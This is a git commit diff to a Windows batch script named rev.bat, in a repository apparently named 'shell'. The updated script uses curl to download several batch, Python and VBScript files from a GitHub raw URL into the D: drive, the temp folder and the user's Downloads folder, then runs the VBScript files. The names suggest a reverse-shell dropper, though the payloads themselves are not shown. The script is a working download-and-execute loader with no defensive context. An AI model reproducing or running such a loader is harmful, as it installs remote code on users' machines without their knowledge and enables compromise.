5f70649830f379eca88a382aaac65c48905f00fe
Omar Samy <osamy7592@gmail.com>
2024-05-04 02:26:17 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -1,7 +1,11 @@
 @echo off
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/pro.bat -o D:\pro.bat 
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/sh.py -o D:\sh.py 
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb.vbs -o D:\vb.vbs 
-curl https://raw.githubusercontent.com/omarsamyX0/shell/main/del.bat -o D:\del.bat
-call D:\vb.vbs
+set "downloads_dir=%USERPROFILE%\Downloads"
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/pro.bat -o D:\pro.bat
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/sh.py -o %temp%\sh.py
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb.vbs -o D:\vb.vbs
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/vb1.vbs -o "%downloads_dir%\vb1.vbs"
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/post.bat -o "%downloads_dir%\post.bat"
+curl https://raw.githubusercontent.com/omarsamyX0/shell/main/post.vbs -o "%downloads_dir%\post.vbs"
+start /wait D:\vb.vbs
+call "%downloads_dir%\vb1.vbs"
 exit
